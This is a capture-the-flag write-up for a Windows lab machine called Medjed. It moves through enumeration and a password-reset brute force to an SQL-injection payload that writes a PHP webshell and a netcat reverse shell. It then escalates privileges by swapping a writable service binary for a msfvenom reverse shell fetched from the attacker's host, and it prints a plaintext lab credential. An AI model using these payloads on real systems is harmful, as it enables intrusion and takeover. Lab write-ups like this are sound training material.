# Medjed

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 4000 192.168.233.127           
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-30 20:31 +08
Nmap scan report for 192.168.233.127
Host is up (0.17s latency).
Not shown: 65484 closed tcp ports (conn-refused), 33 filtered tcp ports (no-response)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3306/tcp  open  mysql
5040/tcp  open  unknown
7680/tcp  open  pando-pub
8000/tcp  open  http-alt
30021/tcp open  unknown
33033/tcp open  unknown
44330/tcp open  unknown
45332/tcp open  unknown
45443/tcp open  unknown
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
```

Loads of ports that are open. We can do a detailed scan to see what services are running on each application.&#x20;

```
$ sudo nmap -p 135,139,445,3306,7680,8000,30021,33033,44330,45332,45443 -sC -sV --min-rate 5000 192.168.233.127 
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-30 20:32 +08
Nmap scan report for 192.168.233.127
Host is up (0.17s latency).

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql?
| fingerprint-strings: 
|   LDAPSearchReq, LPDString, NULL, WMSRequest, X11Probe: 
|_    Host '192.168.45.161' is not allowed to connect to this MariaDB server
7680/tcp  open  pando-pub?
8000/tcp  open  http-alt      BarracudaServer.com (Windows)
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 200 OK
|     Date: Fri, 30 Jun 2023 12:32:38 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   GenericLines: 
|     HTTP/1.1 200 OK
|     Date: Fri, 30 Jun 2023 12:32:32 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Fri, 30 Jun 2023 12:32:33 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Date: Fri, 30 Jun 2023 12:32:44 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   SIPOptions: 
|     HTTP/1.1 400 Bad Request
|     Date: Fri, 30 Jun 2023 12:33:49 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|     Content-Type: text/html
|     Cache-Control: no-store, no-cache, must-revalidate, max-age=0
|     <html><body><h1>400 Bad Request</h1>Can't parse request<p>BarracudaServer.com (Windows)</p></body></html>
|   Socks5: 
|     HTTP/1.1 200 OK
|     Date: Fri, 30 Jun 2023 12:32:39 GMT
|     Server: BarracudaServer.com (Windows)
|_    Connection: Close
|_http-server-header: BarracudaServer.com (Windows)
|_http-title: Home
| http-methods: 
|_  Potentially risky methods: PROPFIND PUT COPY DELETE MOVE MKCOL PROPPATCH LOCK UNLOCK
| http-webdav-scan: 
|   Server Date: Fri, 30 Jun 2023 12:34:58 GMT
|   Server Type: BarracudaServer.com (Windows)
|   WebDAV type: Unknown
|_  Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, PUT, COPY, DELETE, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
30021/tcp open  ftp           FileZilla ftpd 0.9.41 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -r--r--r-- 1 ftp ftp            536 Nov 03  2020 .gitignore
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 app
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 bin
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 config
| -r--r--r-- 1 ftp ftp            130 Nov 03  2020 config.ru
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 db
| -r--r--r-- 1 ftp ftp           1750 Nov 03  2020 Gemfile
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 lib
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 log
| -r--r--r-- 1 ftp ftp             66 Nov 03  2020 package.json
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 public
| -r--r--r-- 1 ftp ftp            227 Nov 03  2020 Rakefile
| -r--r--r-- 1 ftp ftp            374 Nov 03  2020 README.md
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 test
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 tmp
|_drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 vendor
|_ftp-bounce: bounce working!
33033/tcp open  unknown
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 3102
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8" />
|     <title>Action Controller: Exception caught</title>
|     <style>
|     body {
|     background-color: #FAFAFA;
|     color: #333;
|     margin: 0px;
|     body, p, ol, ul, td {
|     font-family: helvetica, verdana, arial, sans-serif;
|     font-size: 13px;
|     line-height: 18px;
|     font-size: 11px;
|     white-space: pre-wrap;
|     pre.box {
|     border: 1px solid #EEE;
|     padding: 10px;
|     margin: 0px;
|     width: 958px;
|     header {
|     color: #F0F0F0;
|     background: #C52F24;
|     padding: 0.5em 1.5em;
|     margin: 0.2em 0;
|     line-height: 1.1em;
|     font-size: 2em;
|     color: #C52F24;
|     line-height: 25px;
|     .details {
|_    bord
44330/tcp open  ssl/unknown
|_ssl-date: 2023-06-30T12:35:13+00:00; -2s from scanner time.
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 200 OK
|     Date: Fri, 30 Jun 2023 12:33:45 GMT
|     Server: BarracudaServer.com (Windows)
|_    Connection: Close
| ssl-cert: Subject: commonName=server demo 1024 bits/organizationName=Real Time Logic/stateOrProvinceName=CA/countryName=US
| Not valid before: 2009-08-27T14:40:47
|_Not valid after:  2019-08-25T14:40:47
45332/tcp open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
|_http-title: Quiz App
| http-methods: 
|_  Potentially risky methods: TRACE
45443/tcp open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Quiz App
```

Loads of enumeration to do. This box was full of rabbit holes to enumerate.

### Port 45332 -> PHPInfo

This page was some kind of quiz thing:

<figure><img src="../../../.gitbook/assets/image (1363).png" alt=""><figcaption></figcaption></figure>

I noticed that the `nmap` scan tells me this is a PHP site. I ran a directory scan via `gobuster` and found the `phpinfo.php` file being present:

{% code overflow="wrap" %}
```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/dirsearch.txt -u http://192.168.233.127:45332 -x html,php,txt -t 100 2> /dev/null
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.233.127:45332
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/dirsearch.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
2023/06/30 20:57:07 Starting gobuster in directory enumeration mode
===============================================================
<TRUNCATED>
/phpinfo.php          (Status: 200) [Size: 90796]
/phpinfo.php          (Status: 200) [Size: 90796]
```
{% endcode %}

On the `phpinfo.php` page, we can find the `DOCUMENT_ROOT` variable:

<figure><img src="../../../.gitbook/assets/image (795).png" alt=""><figcaption></figcaption></figure>

There were also no disabled functions, which was great:

<figure><img src="../../../.gitbook/assets/image (3952).png" alt=""><figcaption></figcaption></figure>

We might need some additional information from here later.&#x20;

### Rabbit Hole -> Port 8000

Port 8000 had a BarracudaServer instance:

<figure><img src="../../../.gitbook/assets/image (149).png" alt=""><figcaption></figcaption></figure>

It appears that we can set the administrator for this machine:

<figure><img src="../../../.gitbook/assets/image (647).png" alt=""><figcaption></figcaption></figure>

Apart from that, we could not do anything else on this website after running directory scans on it.&#x20;

### Rabbit Hole -> FTP Anonymous

Port 30021 allowed for anonymous access via FTP.&#x20;

```
$ ftp 192.168.233.127 -P 30021
Connected to 192.168.233.127.
220-FileZilla Server version 0.9.41 beta
220-written by Tim Kosse (Tim.Kosse@gmx.de)
220 Please visit http://sourceforge.net/projects/filezilla/
Name (192.168.233.127:kali): anonymous
331 Password required for anonymous
Password: 
230 Logged on
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||49889|)
150 Connection accepted
-r--r--r-- 1 ftp ftp            536 Nov 03  2020 .gitignore
drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 app
drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 bin
drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 config
-r--r--r-- 1 ftp ftp            130 Nov 03  2020 config.ru
drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 db
-r--r--r-- 1 ftp ftp           1750 Nov 03  2020 Gemfile
drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 lib
drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 log
-r--r--r-- 1 ftp ftp             66 Nov 03  2020 package.json
drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 public
-r--r--r-- 1 ftp ftp            227 Nov 03  2020 Rakefile
-r--r--r-- 1 ftp ftp            374 Nov 03  2020 README.md
drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 test
drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 tmp
drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 vendor
226 Transfer OK
```

There wasn't much in this entire directory, as it included loads of random files and what not. I didn't know what to do with all of it, so I moved on first.

### Port 33033 -> Login Bypass

This website had a corporate page of some sorts:

<figure><img src="../../../.gitbook/assets/image (1163).png" alt=""><figcaption></figcaption></figure>

There was a login page:

<figure><img src="../../../.gitbook/assets/image (427).png" alt=""><figcaption></figcaption></figure>

Weak credentials don't work, and we cannot bypass this login using SQL Injection of any sort. The reset password option just leads us to another page:

<figure><img src="../../../.gitbook/assets/image (3669).png" alt=""><figcaption></figcaption></figure>

I attempted to reset the password of the `admin` user, but it seems that it doesn't exist:

<figure><img src="../../../.gitbook/assets/image (688).png" alt=""><figcaption></figcaption></figure>

If were to try with some of the users on the main page, we would trigger a different error:

<figure><img src="../../../.gitbook/assets/image (1075).png" alt=""><figcaption></figcaption></figure>

Here's the part I found incredibly stupid, we actually needed to brute force the users to find the correct 'reminder'. Here's the correct user after trying a load of them:

<figure><img src="../../../.gitbook/assets/image (696).png" alt=""><figcaption></figcaption></figure>

Once we reset this, we can login to view the dashboard:

<figure><img src="../../../.gitbook/assets/image (801).png" alt=""><figcaption></figcaption></figure>

### SQL Injection -> RCE

Within the "Edit" function, we can see that there's a Request Profile SLUG option at the bottom:

<figure><img src="../../../.gitbook/assets/image (3926).png" alt=""><figcaption></figcaption></figure>

This brings us to another page with a hint that MySQL was being used somehow:

<figure><img src="../../../.gitbook/assets/image (426).png" alt=""><figcaption></figcaption></figure>

If we enter `'` into the URL field, we get an SQL error:

<figure><img src="../../../.gitbook/assets/image (237).png" alt=""><figcaption></figcaption></figure>

Interesting. Since we basically have an SQL Interpreter here, we can make it write a webshell in PHP onto the file system. Earlier, we found that the `DOCUMENT_ROOT` of one of the web applications was at `C:\xampp\htdocs`, which we can use.

We can then use this payload to write a webshell:

{% code overflow="wrap" %}
```sql
' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/web.php'  -- -' 
```
{% endcode %}

This would work, and then we can attempt to access this shell on port 45332.&#x20;

<figure><img src="../../../.gitbook/assets/image (220).png" alt=""><figcaption></figcaption></figure>

We can then download `nc64.exe` onto the machine and get a reverse shell:

<figure><img src="../../../.gitbook/assets/image (327).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### WinPEAS -> Insecure Service Binary

I ran `winPEAS.exe` to enumerate for me. Firstly, we can find some credentials:

```
Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultUserName               :  Jerren
    DefaultPassword               :  CatastropheToes54
```

We can also find a possible service to exploit:

<figure><img src="../../../.gitbook/assets/image (607).png" alt=""><figcaption></figcaption></figure>

It appears that can modify `bd.exe`:

```
C:\bd>icacls bd.exe
icacls bd.exe
bd.exe BUILTIN\Administrators:(I)(F)
       NT AUTHORITY\SYSTEM:(I)(F)
       BUILTIN\Users:(I)(RX)
       NT AUTHORITY\Authenticated Users:(I)(M)
```

This is a Windows Service, so it is run by the SYSTEM user. We can make use of this by overwriting the file with our own reverse shell. First, generate our reverse shell payload:

```
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.161 LPORT=443 -f exe > shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
```

Then, we can replace the `bd.exe` file and then restart the machine:

```
C:\bd>move bd.exe old.exe
move bd.exe old.exe
        1 file(s) moved.

C:\bd>powershell -c wget 192.168.45.161:8000/shell.exe -Outfile bd.exe

C:\bd>shutdown -r 
```

After a while, we should get a reverse shell once the machine starts up again as the SYSTEM user:

<figure><img src="../../../.gitbook/assets/image (3210).png" alt=""><figcaption></figcaption></figure>

Rooted!
